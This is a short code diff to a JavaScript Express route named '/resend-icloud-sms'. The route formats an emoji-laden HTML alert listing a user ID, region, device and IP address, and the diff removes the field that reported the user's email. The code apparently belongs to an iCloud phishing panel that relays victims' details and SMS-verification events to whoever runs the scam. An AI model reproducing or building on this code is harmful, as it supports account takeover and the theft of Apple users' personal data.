@@ -1018,7 +1018,6 @@ app.post("/resend-icloud-sms", async (req, res) => {
     const message =
       `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
